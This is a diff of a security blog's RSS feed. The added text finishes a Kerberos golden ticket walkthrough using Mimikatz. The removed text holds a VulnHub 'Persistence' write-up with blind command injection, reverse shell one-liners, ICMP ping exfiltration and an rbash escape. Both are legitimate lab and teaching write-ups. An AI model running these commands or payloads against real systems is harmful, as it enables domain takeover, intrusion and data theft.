+&lt;li&gt;The Domains SID. &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The &lt;code&gt;krbtgt&lt;/code&gt; accounts NT hash. &lt;code&gt;95a11f7d93fa3a5a61073662e6bd8468&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;A username (fake or real, does not matter. Not fake if you need opsec ofc!). &lt;code&gt;darthvader&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;creating-the-golden-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;creating the golden ticket&lt;/h2&gt;
+
+&lt;p&gt;Creating the golden ticket is now a really simple task. We will simply call &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!&lt;/p&gt;
+
+&lt;p&gt;For details about the command and arguments required, I referred to the &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver&#34;&gt;mimikatz wiki&lt;/a&gt; and replicated that. Our command should look something like the below, saving our golden ticket to &lt;code&gt;golden.tck&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Running this mimikatz command with &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; gets us our Golden Ticket:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_created.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;injecting-the-golden-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;injecting the golden ticket&lt;/h2&gt;
+
+&lt;p&gt;The final test is to &lt;em&gt;use&lt;/em&gt; this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative &lt;code&gt;c$&lt;/code&gt; share of the Domain Controller!&lt;/p&gt;
+
+&lt;p&gt;Lets purge the currently cached Kerberos tickets first:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\users\bobs\downloads\golden&amp;gt; Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::purge&amp;quot;&#39;
+
+[... snip ...]
+
+mimikatz(powershell) # kerberos::purge
+Ticket(s) purge for current session is OK
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, we inject the golden ticket we created using the mimikatz &lt;code&gt;kerberos::ptt&lt;/code&gt; command to &lt;em&gt;&amp;lsquo;Pass The Ticket&amp;rsquo;&lt;/em&gt;:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_ptt.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;After the ticket is injected into memory, we can verify its existence with the mimikaz &lt;code&gt;kerberos::list&lt;/code&gt; command, or just using &lt;code&gt;klist&lt;/code&gt;. Once it is injected, we &lt;code&gt;dir&lt;/code&gt; the Domain Controllers &lt;code&gt;c$&lt;/code&gt; share&amp;hellip; an &lt;em&gt;smile&lt;/em&gt;. The password for &lt;code&gt;scvSQLServ&lt;/code&gt; can now change, it will no longer bother us!&lt;/p&gt;
+
+&lt;p&gt;
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_admin.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&#34;conclusion:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;conclusion&lt;/h2&gt;
+
+&lt;p&gt;In this post we saw how it is possible to &amp;lsquo;crack&amp;rsquo; badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN&amp;rsquo;s were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.&lt;/p&gt;
+
+&lt;p&gt;Then, we explored how it is possible to extract Domain Account hashes using the mimikatz &lt;em&gt;DCSync&lt;/em&gt; feature and generate a Kerberos Golden Ticket with high access levels in the domain.&lt;/p&gt;
+
+&lt;p&gt;I think there is still a loooong road ahead for the Microsoft Kerberos Implementations&amp;hellip; Until they &amp;lsquo;fix&amp;rsquo; this stuff, thing should remain interesting for quite some time to come.&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>a totally unnecessary composer shell</title>
@@ -8172,1019 +8671,6 @@ a70354f0258dcc00292c72aab3c8b1e4
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/Maleus21&#34;&gt;@Maleus21&lt;/a&gt; for the fun VM and &lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; for the hosting :)&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>From Persistence</title>
-      <link>https://leonjza.github.io/blog/2014/09/18/from-persistence/</link>
-      <pubDate>Thu, 18 Sep 2014 06:58:53 +0000</pubDate>
-      
-      <guid>https://leonjza.github.io/blog/2014/09/18/from-persistence/</guid>
-      <description>
-
-&lt;h2 id=&#34;persist-we-must:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;persist we must!&lt;/h2&gt;
-
-&lt;p&gt;Persistence! A new boot2root hosted &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;, authored by &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;@superkojiman&lt;/a&gt; and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a &lt;a href=&#34;http://blog.vulnhub.com/2014/09/competition-persistence.html&#34;&gt;writeup competition&lt;/a&gt; launched on September the 7th, and ran up until October th 5th.&lt;/p&gt;
-
-&lt;p&gt;This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &amp;ldquo;meh, next&amp;rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!&lt;/p&gt;
-
-&lt;h2 id=&#34;lets-get-our-hands-dirty:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;lets get our hands dirty&lt;/h2&gt;
-
-&lt;p&gt;As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.&lt;/p&gt;
-
-&lt;p&gt;My VM got the IP 192.168.56.104, and the first Nmap result was:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.104 --reason -sV -p-
-
-Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 07:01 SAST
-Nmap scan report for 192.168.56.104
-Host is up, received reset (0.0037s latency).
-Not shown: 65534 filtered ports
-Reason: 65534 no-responses
-PORT   STATE SERVICE REASON  VERSION
-80/tcp open  http    syn-ack nginx 1.4.7
-
-Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 4131.90 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.&lt;/p&gt;
-
-&lt;p&gt;Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&amp;hellip;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.&lt;/p&gt;
-
-&lt;p&gt;By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried &lt;code&gt;index.html&lt;/code&gt;, and got the normal landing. When I requested &lt;code&gt;index.php&lt;/code&gt; though, things changed drastically:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl -v 192.168.56.104/index.php
-* About to connect() to 192.168.56.104 port 80 (#0)
-*   Trying 192.168.56.104...
-* connected
-* Connected to 192.168.56.104 (192.168.56.104) port 80 (#0)
-&amp;gt; GET /index.php HTTP/1.1
-&amp;gt; User-Agent: curl/7.26.0
-&amp;gt; Host: 192.168.56.104
-&amp;gt; Accept: */*
-
-* additional stuff not fine transfer.c:1037: 0 0
-* HTTP 1.1 or later with persistent connection, pipelining supported
-&amp;lt; HTTP/1.1 404 Not Found
-&amp;lt; Server: nginx/1.4.7
-&amp;lt; Date: Thu, 18 Sep 2014 07:28:18 GMT
-&amp;lt; Content-Type: text/html
-&amp;lt; Transfer-Encoding: chunked
-&amp;lt; Connection: keep-alive
-&amp;lt; X-Powered-By: PHP/5.3.3
-
-No input file specified.
-
-* Connection #0 to host 192.168.56.104 left intact
-* Closing connection #0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As can be seen in the output above, the header &lt;code&gt;X-Powered-By: PHP/5.3.3&lt;/code&gt; is now present, and the output &lt;code&gt;No input file specified.&lt;/code&gt;. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.&lt;/p&gt;
-
-&lt;h2 id=&#34;finding-that-de-bugger:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;finding that (de)bugger&lt;/h2&gt;
-
-&lt;p&gt;With this information now gathered, it was time to pull out one of my favorite tools, &lt;code&gt;wfuzz&lt;/code&gt;! With &lt;code&gt;wfuzz&lt;/code&gt;, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.&lt;/p&gt;
-
-&lt;p&gt;My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending &lt;em&gt;.php&lt;/em&gt; to my &lt;code&gt;FUZZ&lt;/code&gt; keyword:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php
-
-********************************************************
-* Wfuzz  2.0 - The Web Bruteforcer                     *
-********************************************************
-
-Target: http://192.168.56.104/FUZZ.php
-Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
-
-Total requests: 1660
-==================================================================
-ID  Response   Lines      Word         Chars          Request
-==================================================================
-
-00434:  C=200     12 L        28 W      357 Ch    &amp;quot; - debug&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Yay. &lt;code&gt;wfuzz&lt;/code&gt; is stupidly fast and finished the above in like 4 seconds. Browsing to &lt;a href=&#34;http://192.168.56.101/debug.php&#34;&gt;http://192.168.56.101/debug.php&lt;/a&gt; showed us a input field labeled &amp;ldquo;Ping address:&amp;rdquo; and a submit button&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/persistence_debug_php.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;&amp;ldquo;Command injection?&amp;rdquo;, was the first thought here.&lt;/p&gt;
-
-&lt;h2 id=&#34;blind-command-injection:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;blind command injection&lt;/h2&gt;
-
-&lt;p&gt;I started by entering a valid IP address that had &lt;code&gt;tcpdump&lt;/code&gt; listening to test if the script is actually running a ping like it says &amp;hellip;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tcpdump icmp
-tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
-07:46:15.503023 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 1, length 64
-07:46:15.503040 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 1, length 64
-07:46:16.503729 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 2, length 64
-07:46:16.503768 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 2, length 64
-07:46:17.503180 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 3, length 64
-07:46:17.503260 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 3, length 64
-07:46:18.502811 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 64004, seq 4, length 64
-07:46:18.502842 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 64004, seq 4, length 64
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&amp;hellip; which it was. What is important to note here is that we have 4 echo requests.&lt;/p&gt;
-
-&lt;p&gt;I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field &lt;code&gt;;exit 0;&lt;/code&gt; caused the HTTP request to complete almost instantly while no ping requests were observed on the &lt;code&gt;tcpdump&lt;/code&gt;. This had me certain that this field was vulnerable to a command injection vulnerability.&lt;/p&gt;
-
-&lt;p&gt;This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.&lt;/p&gt;
-
-&lt;p&gt;I tried the usual culprits: &lt;code&gt;nc &amp;lt;ip&amp;gt;  &amp;lt;port&amp;gt; -e /bin/bash&lt;/code&gt;; &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt;; &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;&amp;lt;ip&amp;gt;&amp;quot;,&amp;lt;port&amp;gt;);exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;&lt;/code&gt;. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?&lt;/p&gt;
-
-&lt;h2 id=&#34;blind-command-injection-file-enumeration:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;blind command injection - file enumeration&lt;/h2&gt;
-
-&lt;p&gt;Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.&lt;/p&gt;
-
-&lt;p&gt;I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash &lt;code&gt;if [ -f /file ]&lt;/code&gt; statement, with a single ping for success, and 2 pings for a failure. The string for the &lt;code&gt;debug.php&lt;/code&gt; input field looked something like this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Submitting the above input presented me with a single ping, confirming that &lt;code&gt;/bin/sh&lt;/code&gt; exists.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tcpdump icmp
-tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
-08:15:53.557994 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 63493, seq 1, length 64
-08:15:53.558011 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 63493, seq 1, length 64
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Checking for something like &lt;code&gt;/bin/sh2&lt;/code&gt; responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as &lt;code&gt;/bin/nc&lt;/code&gt;, I may end up with greater success of a shell!&lt;/p&gt;
-
-&lt;p&gt;I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  &lt;code&gt;/usr/bin/python&lt;/code&gt; appeared to be available! I really like python so this had me really happy.&lt;/p&gt;
-
-&lt;h2 id=&#34;blind-command-injection-port-scanner:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;blind command injection - port scanner&lt;/h2&gt;
-
-&lt;p&gt;I tested a few commands with &lt;code&gt;python -c&lt;/code&gt;, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.&lt;/p&gt;
-
-&lt;p&gt;No. Luck.&lt;/p&gt;
-
-&lt;p&gt;I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &amp;lsquo;prober&amp;rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my &lt;code&gt;tcpdump&lt;/code&gt; for any tcp traffic comming from this host:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
-for port in xrange(1, 65535):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(0.1)
-    sock.connect_ex((&amp;quot;192.168.56.102&amp;quot;, port))
-    sock.close()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Using my blind command injection, I echoed this content to &lt;code&gt;/tmp/probe.py&lt;/code&gt; via the input field, and then in a subsequent request, ran it using &lt;code&gt;python /tmp/probe.py&lt;/code&gt;. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&amp;hellip;&lt;/p&gt;
-
-&lt;h2 id=&#34;data-exfiltration:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;data exfiltration&lt;/h2&gt;
-
-&lt;p&gt;With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the &lt;code&gt;debug.php&lt;/code&gt; file on disk and tried to echo a PHP web shell to the same directory. This also failed.&lt;/p&gt;
-
-&lt;p&gt;So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.&lt;/p&gt;
-
-&lt;p&gt;Eventually, I came across the &lt;code&gt;-p&lt;/code&gt; argument for ping after reading &lt;a href=&#34;http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html&#34;&gt;this&lt;/a&gt; blogpost. From &lt;code&gt;man 8 ping&lt;/code&gt; we read:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-p pattern
-   You may specify up to 16 ``pad&#39;&#39; bytes to fill out the packet you send.
-   This is useful for diagnosing data-dependent problems in a network.
-   For example, ``-p ff&#39;&#39; will cause the sent packet to be filled with all ones.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So that changes things. I quickly confirmed that we have &lt;code&gt;xxd&lt;/code&gt; available using my previous enumeration method and we did. Great.&lt;/p&gt;
-
-&lt;p&gt;I fired up tcpdump with the &lt;code&gt;-X&lt;/code&gt; flag to show me the packet contents, and tested it out with the following payload for the &lt;code&gt;id&lt;/code&gt; command:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;On the &lt;code&gt;tcpdump&lt;/code&gt; side of things&amp;hellip;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop# tcpdump icmp -X
-tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
-09:18:14.439222 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 6920, seq 1, length 64
-    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
-    0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K[....V..T
-    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
-    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
-    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
-    0x0050:  3439 3828                                498(
-09:18:14.439248 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 6920, seq 1, length 64
-    0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
-    0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S[....V..T
-    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
-    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
-    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
-    0x0050:  3439 3828                                498(
-09:18:14.440365 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 7176, seq 1, length 64
-    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
-    0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
-    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
-    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
-    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
-    0x0050:  3938 286e                                98(n
-09:18:14.440382 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 7176, seq 1, length 64
-    0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
-    0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
-    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
-    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
-    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
-    0x0050:  3938 286e                                98(n
-09:18:14.441191 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 7432, seq 1, length 64
-    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
-    0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
-    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
-    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
-    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
-    0x0050:  3d34 3938                                =498
-09:18:14.441198 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 7432, seq 1, length 64
-    0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&amp;gt;..8f
-    0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
-    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
-    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
-    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
-    0x0050:  3d34 3938                                =498
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Mind. Blown.&lt;/p&gt;
-
-&lt;p&gt;In case you don&amp;rsquo;t see it, we have extracts of the &lt;code&gt;id&lt;/code&gt; command in the request/response packets like &lt;em&gt;98(nginx).grid=4&lt;/em&gt;. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact &lt;strong&gt;something&lt;/strong&gt; to work with!&lt;/p&gt;
-
-&lt;p&gt;I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; sniff(filter=&amp;quot;icmp[icmptype] == 8 and host 192.168.56.104&amp;quot;, prn=lambda x: x.load)
-ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
-ؤT
-   ginx) grid=498(nginx) grid=498(nginx) grid=498(n
-ؤT�(nginx)
-oups=498(nginx)
-oups=498(nginx)
-oups=498
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;sysadmin-tool:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;sysadmin-tool&lt;/h2&gt;
-
-&lt;p&gt;So with actual output to work with, I can almost say I have shell, however, it&amp;rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.&lt;/p&gt;
-
-&lt;p&gt;At one stage I ran &lt;code&gt;ls&lt;/code&gt; as the command trying to see if there was anything in the web path that I may not have found yet. A file called &lt;em&gt;sysadmin-tool&lt;/em&gt; was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through &lt;code&gt;strings&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# strings sysadmin-tool
-/lib/ld-linux.so.2
-__gmon_start__
-libc.so.6
-_IO_stdin_used
-chroot
-strncmp
-puts
-setreuid
-mkdir
-rmdir
-chdir
-system
-__libc_start_main
-GLIBC_2.0
-PTRh
-[^_]
-Usage: sysadmin-tool --activate-service
---activate-service
-breakout
-/bin/sed -i &#39;s/^#//&#39; /etc/sysconfig/iptables
-/sbin/iptables-restore &amp;lt; /etc/sysconfig/iptables
-Service started...
-Use avida:dollars to access.
-/nginx/usr/share/nginx/html/breakout
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.104 --reason -sV -p-
-
-Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 09:46 SAST
-Nmap scan report for 192.168.56.104
-Host is up, received reset (0.0017s latency).
-Not shown: 65533 filtered ports
-Reason: 65533 no-responses
-PORT   STATE SERVICE REASON  VERSION
-22/tcp open  ssh     syn-ack OpenSSH 5.3 (protocol 2.0)
-80/tcp open  http    syn-ack nginx 1.4.7
-
-Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Yay! SSH.&lt;/p&gt;
-
-&lt;h2 id=&#34;shell-and-breakout-as-avida:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;shell and breakout as avida&lt;/h2&gt;
-
-&lt;p&gt;Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
-The authenticity of host &#39;192.168.56.104 (192.168.56.104)&#39; can&#39;t be established.
-RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added &#39;192.168.56.104&#39; (RSA) to the list of known hosts.
-avida@192.168.56.104&#39;s password:    # dollars
-Last login: Thu Sep 18 05:57:30 2014
--rbash-4.1$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Op success. Or is it? I immediately noticed the prompt as &lt;code&gt;rbash&lt;/code&gt;, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a &lt;code&gt;/&lt;/code&gt; in them.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-rbash-4.1$ /bin/bash
--rbash: /bin/bash: restricted: cannot specify `/&#39; in command names
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So the next logical step was to attempt &amp;lsquo;breaking out&amp;rsquo; of this shell so that I can have a better look around. I was able to cat say &lt;code&gt;/etc/passwd&lt;/code&gt;, but that only gets you &lt;em&gt;that&lt;/em&gt; far :P&lt;/p&gt;
-
-&lt;p&gt;After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic &lt;code&gt;vi&lt;/code&gt; &lt;code&gt;:shell&lt;/code&gt; breakout. Eventually (and out of desperation), I focussed my attention to &lt;code&gt;ftp&lt;/code&gt;. Opening &lt;code&gt;ftp&lt;/code&gt;, and typing &lt;code&gt;help&lt;/code&gt; at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-rbash-4.1$ ftp
-ftp&amp;gt; !
-+rbash-4.1$ /bin/bash
-bash-4.1$
-&lt;/code&gt;&lt;/pre&gt;
-
